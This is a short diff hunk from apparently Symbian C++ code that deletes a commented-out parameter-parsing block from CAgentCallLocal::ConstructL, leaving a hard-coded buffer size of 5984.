@@ -73,14 +73,6 @@ void CAgentCallLocal::ConstructL(const TDesC8& params)
 		
 	BaseConstructL(params);
 	
-	// agent parameters are not used
-	/*
-	TUint8* ptr = (TUint8 *)iParams.Ptr();
-	Mem::Copy( &iBuffSize, ptr, 4);
-	ptr += 4;
-	Mem::Copy(&iCompression,ptr,4 );
-	*/
-	
 	//we don't consider agent parameters coz we need smaller buffers
 	iBuffSize=5984; 
 	
